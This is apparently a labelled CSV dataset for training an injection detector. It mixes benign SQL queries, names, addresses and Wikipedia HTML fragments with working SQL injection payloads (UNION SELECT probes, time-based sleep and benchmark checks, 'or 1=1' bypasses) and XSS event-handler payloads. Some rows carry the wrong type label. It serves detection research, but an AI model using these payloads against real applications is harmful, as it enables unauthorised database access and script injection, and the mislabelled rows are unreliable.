Text,Label,type
<summary id=x tabindex=1 onfocusin=alert(1)></summary>,2,xss
SELECT * FROM sudden WHERE pig = 'pile'  OR hand = 'mix',0,sql
6.5524E+15,0,sql
harold_veigel@ilusionarium.sk,0,sql
"   SELECT Employees.asleep, COUNT ( Orders.furID )  AS gentlyFROM    ( OrdersINNER JOIN necessary ON Orders.wolfID  =  Employees.visitID ) ",0,sql
"benchmark  (  10000000,MD5  (  1   )    )   #",1,sql
charmion,0,sql
SELECT outer ( s )  FROM object SELECT waste ( s ) ,0,sql
SELECT third FROM dozen UNION ALL SELECT wonderful FROM opportunity ORDER BY welcome,0,sql
"<sub draggable=""true"" ondragenter=""alert(1)"">test</sub>",2,xss
SELECT MIN ( hot )  AS sum FROM shoe,0,sql
SELECT * FROM receive WHERE Price NOT BETWEEN 10 AND 20,0,sql
cholewin,0,sql
30034324g,0,sql
SELECT * FROM let,0,sql
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",1,sql
SELECT * FROM border FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",1,sql
protti tarrasa,0,sql
SELECT Count ( * )  AS education,0,sql
"<blink onclick=""alert(1)"">test</blink>",2,xss
"<dt><a class=""reference internal"" href=""topics/signals.html""><span class=""doc"">Signals",0,xss
SELECT * FROM glass ORDER BY now DESC,0,sql
"<samp onclick=""alert(1)"">test</samp>",2,xss
URL=javascript:alert(''),2,xss
SELECT option_value FROM wp_options WHERE option_name  =  '_options_number_of_support_family' LIMIT 1,0,sql
"<frame draggable=""true"" ondragend=""alert(1)"">test</frame>",2,xss
	 <div>,0,xss
8.88987E+15,0,sql
asisia,0,sql
<ul onpointerout=alert(1)>XSS</ul>,2,xss
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'ndhn' like 'ndhn",1,sql
1 where 8102  =  8102 and 9198  =  9198--,1,sql
" </p><p>Worldwide annual military spending on robotics rose from US$5.1 billion in 2010 to US$7.5 billion in 2015.<sup id=""cite_ref-332"" class=""reference""><a href=""#cite_note-332"">&#91;321&#93; </a> </sup><sup id=""cite_ref-333"" class=""reference""><a href=""#cite_note-333"">&#91;322&#93; </a> </sup> Military drones capable of autonomous action are widely considered a useful asset.<sup id=""cite_ref-334"" class=""reference""><a href=""#cite_note-334"">&#91;323&#93; </a> </sup> Many artificial intelligence researchers seek to distance themselves from military applications of AI.<sup id=""cite_ref-335"" class=""reference""><a href=""#cite_note-335"">&#91;324&#93; </a> </sup>",0,xss
"<dfn onmouseover=""alert(1)"">test</dfn>",2,xss
fluvia,0,xss
"<rtc draggable=""true"" ondragstart=""alert(1)"">test</rtc>",2,xss
-2361'   )    )    as mzhv where 2905  =  2905 or 9026  =  5388--,1,sql
"<link rel=""alternate"" type=""application/atom+xml"" title=""Wikipedia Atom feed"" href=""/w/index.php?title=Special:RecentChanges&amp;feed=atom""/>",0,xss
SELECT * FROM citizen WHERE explanation = 'office' LIMIT 3,0,xss
"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",1,sql
p5li8e5i2,0,sql
"		<label for=""searchInput"">Search </label>",0,xss
"	 <div class=""magnify""><a href=""/wiki/File:ParticleSwarmArrowsAnimation.gif"" class=""internal"" title=""Enlarge""> </a> </div>A <a href=""/wiki/Particle_swarm_optimization"" title=""Particle swarm optimization"">particle swarm </a> seeking the <a href=""/wiki/Global_minimum"" class=""mw-redirect"" title=""Global minimum"">global minimum </a> </div> </div> </div>",0,xss
"   SELECT whether, arrange, problemFROM fear WHERE addition  IS NOT NULL",0,sql
SELECT COUNT ( firm ) FROM element,0,sql
<html onpointermove=alert(1)>XSS</html>,2,xss
SELECT whispered ( s )  FROM idea SELECT evening FROM beginning,0,xss
"c/ cervera 164, 1e",0,sql
SELECT * FROM hungry WHERE    NOT volume = 'run',0,sql
SELECT AVG ( clothing ) FROM sign SELECT SUM ( known ) ,0,sql
"<style>:target {color:red;}</style><legend id=x style=""transition:color 1s"" ontransitionend=alert(1)></legend>",2,xss
SELECT * FROM accurate WHERE camp BETWEEN '1996-07-01' AND '1996-07-31',0,sql
4.67615E+15,0,sql
caravaca de la cruz,0,sql
"<dl onbeforepaste=""alert(1)"" contenteditable>test</dl>",2,xss
lu,0,xss
1  )   as selm where 5759  =  5759,1,xss
"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",1,sql
"  SELECT Orders.opportunityrID, Employees.oxygen, Employees.heard FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.findID ORDER BY Orders.windowID",0,xss
"INSERT INTO die ( smallest, rice, measure, these, truth, distance )  VALUES  ( 'court', 'live'. five', 'boy', 'package', 'determine', 'seven' )  ",0,sql
"<li><a href=""/wiki/Otto_Neurath"" title=""Otto Neurath"">Otto Neurath </a> </li>",0,xss
"<caption oncut=""alert(1)"" contenteditable>test</caption>",2,xss
<svg><sub onload=alert(1)></sub>,2,xss
SELECT glad ( s )  FROM curious,0,sql
"-2071 union all select 4753,4753--",1,sql
1  )   as lisg where 5490  =  5490,1,sql
16154,0,sql
rivalee,0,sql
ermina,0,xss
b3r3al,0,xss
"1' in boolean mode  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
"document.getElementsByClassName(""example"")",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li> </ul>",0,xss
SELECT * FROM slide WHERE hall  BETWEEN 10 AND 20,0,sql
"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
 ,0,xss
<figure onpointerover=alert(1)>XSS</figure>,2,xss
"calle arriola 29,",0,sql
"c/ pozo seco 37, 6-d",0,sql
"1%""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,1,sql
"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'xdfz'  =  'xdfz",1,sql
"<nav onmouseenter=""alert(1)"">test</nav>",2,xss
"<rt onmouseup=""alert(1)"">test</rt>",2,xss
waitfor delay '0:0:5' and    (    (     (  'ywnm'  =  'ywnm,1,sql
SELECT * FROM salt WHERE sale LIKE '%scientist%',0,sql
SELECT * FROM period WHERE Price NOT BETWEEN 10 AND 20,0,sql
pruja lantadilla,0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Related topics </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"	 </span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2FTCIAIG.2013.2286295"">10.1109/TCIAIG.2013.2286295 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Transactions+on+Computational+Intelligence+and+AI+in+Games&amp;rft.atitle=A+Survey+of+Real-Time+Strategy+Game+AI+Research+and+Competition+in+StarCraft&amp;rft.volume=5&amp;rft.issue=4&amp;rft.pages=293-311&amp;rft.date=2013-12&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.406.2524&amp;rft_id=info%3Adoi%2F10.1109%2FTCIAIG.2013.2286295&amp;rft.aulast=Ontanon&amp;rft.aufirst=Santiago&amp;rft.au=Synnaeve%2C+Gabriel&amp;rft.au=Uriarte%2C+Alberto&amp;rft.au=Richoux%2C+Florian&amp;rft.au=Churchill%2C+David&amp;rft.au=Preuss%2C+Mike&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
	 </span> </li>,0,xss
SELECT TOP 3 * FROM twice,0,sql
SELECT * FROM grew WHERE then NOT LIKE '[machine]%',0,sql
"<font onmouseover=""alert(1)"">test</font>",2,xss
"-1844'  )   union all select 9572,9572,9572,9572#",1,sql
1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'zqiw'  =  'zqiw,1,sql
<keygen id=x onfocusin=alert(1)>,2,xss
8.38E+15,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"<font onmouseup=""alert(1)"">test</font>",2,xss
admin'  )   or '1'  =  '1'#,1,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dd id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dd>",2,xss
<output id=x tabindex=1 onbeforeactivate=alert(1)></output>,2,xss
wilbur,0,sql
SELECT * FROM recent FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM settlers,0,sql
"<style>@keyframes slidein {}</style><video style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></video>",2,xss
<sup onpointerleave=alert(1)>XSS</sup>,2,xss
-1772' or 7911  =  4985#,1,sql
selj@ebaz.travel,0,sql
"<title onclick=""alert(1)"">test</title>",2,xss
"-1079""  )   where 2865  =  2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",1,xss
"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,sql
"1'  )   as ybuv where 9641  =  9641 union all select null,null,null,null,null,null,null,null--",1,sql
"1'  )   where 7322  =  7322 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
SELECT * FROM volume WHERE who = 'paint'  AND  ( good = 'discover' OR bigger = 'tired' ) ,0,sql
48552,0,xss
48128,0,xss
"<ul><li><a href=""#CITEREFACM1998"">ACM 1998 </a>, I.2.9, </li>",0,xss
pallen,0,sql
"<font onbeforecopy=""alert(1)"" contenteditable>test</font>",2,xss
"<source draggable=""true"" ondragleave=""alert(1)"">test</source>",2,xss
-2120'  )   or 8734  =  8844#,1,xss
"<style>:target {color: red;}</style><frameset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frameset>",2,xss
 </p>,0,xss
"<li><a href=""/wiki/Herbert_Spencer"" title=""Herbert Spencer"">Herbert Spencer </a> </li>",0,xss
	 </span> </a>,0,xss
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  9348  =  9348",1,sql
abdul-sa,0,sql
SELECT CAST ( 5-10 AS SIGNED ) ;,0,sql
"1""  )   where 6072  =  6072 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,xss
"1   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  9802  =  9802",1,sql
murillo el cuende,0,sql
SELECT * FROM divide WHERE NOT beyond = 'invented'  AND NOT handle = 'fellow',0,sql
"INSERT INTO belong ( route, collect, desert, bowl, smooth, threw )  VALUES  ( 'spread', 'weigh'. forty', 'fear', 'loss', 'apartment', 'studied' )  ",0,sql
1' in boolean mode  )   and 3787  =  7750--,1,sql
"1'||  (  select 'ltqo' where 9080  =  9080 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1,sql
-9446   )    )    as wmrq where 3705  =  3705 union all select 3705#,1,sql
"<li id=""cite_note-416""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-416"">^ </a> </b> ",0,xss
<summary onfocusout=alert(1) tabindex=1 id=x></summary><input autofocus>,2,xss
" SELECT column_name ( s )  FROM wall,sides",0,sql
1103,0,sql
"<b onclick=""alert(1)"">test</b>",2,xss
"<button onmouseup=""alert(1)"">test</button>",2,xss
"<input onmousemove=""alert(1)"">test</input>",2,xss
"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",1,xss
"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'dhqz'  =  'dhqz",1,xss
SELECT * FROM factory WHERE team = 'into',0,sql
"	 </span> <span class=""toctext"">Symbolic ",0,xss
